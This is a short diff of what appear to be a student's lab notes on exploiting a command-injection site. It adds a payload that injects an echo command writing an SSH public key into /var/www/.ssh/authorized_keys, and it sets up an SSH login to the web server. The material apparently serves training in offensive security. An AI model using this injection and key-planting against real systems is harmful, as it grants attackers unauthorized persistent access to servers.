@@ -285,7 +285,8 @@ ls -la ../../.ssh/
 
 ##back to the command injection site 
 
-; echo "(paste ==student@lin-ops)">>/var/www/.ssh/authorized_keys ##not the actual conents drop everything between the () in stead us the past content 
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLJr+sUzLd4r4jh5gF/sDyAzVY8srkZ3icckoPm5ILzbl1Ejav3D65pgXH/lQdgPDIoUdZGU+Emk3fMuI87XW4qRuJzFCsLTn/mt7TR9bg9yyc8AHtu7zvN926ONI9sHLQowJfEr6f6ulngSQ0Vlnw2AK72nXF2P7vazjsvhLL024JfDvlrZjX9PUeyNkZfdhfgTlHC9ml8/vzrtKyK2cUB9w6RaR3Ep4dbmO37mY26uNUIPGfNqcT6X++xv6HH3Wr9fzRUnOuwqgWAc2fKsZr7ZDJZrZSoRbgswo8+rOjN4JTNm9ntLBV/kVI9Tn2lHG2CVumXjtUhPJ26PQfULSaADEzLJGOI8A24/m8G+VESL/jozYHMoFa42afvKwWgUNGhcWzLRhPwfzxYPFCUOGnVZVNJE0WDLxme2wg4cHH7pOcSr5Ki4qlzT7SBmLyPPKrq7L2LTgt6ycjMZHC+p9dCY9+IZkLQ9kSBYcmYhLB7CmkYfydQqNTIFe/QwFIQ83pSyn211I1RO04LgGrGvNFR/D5pZEUVGv/geIdrtO7Vcj3Gh2ob6KCrCq3r/jPD+WFGr7olU0eLYJM6pujMmWd7QfGU0vVhO9GJNGntJgfuTDIsb71zNTPZjRNXHiAe9YPclK5GBbMTk2NoRVdgx2ZTZXqVQoyHKC9nOzLJ0C+OQ== student@lin-ops
+">>/var/www/.ssh/authorized_keys 
 
 ### attempt to ssh to the webserver 
 
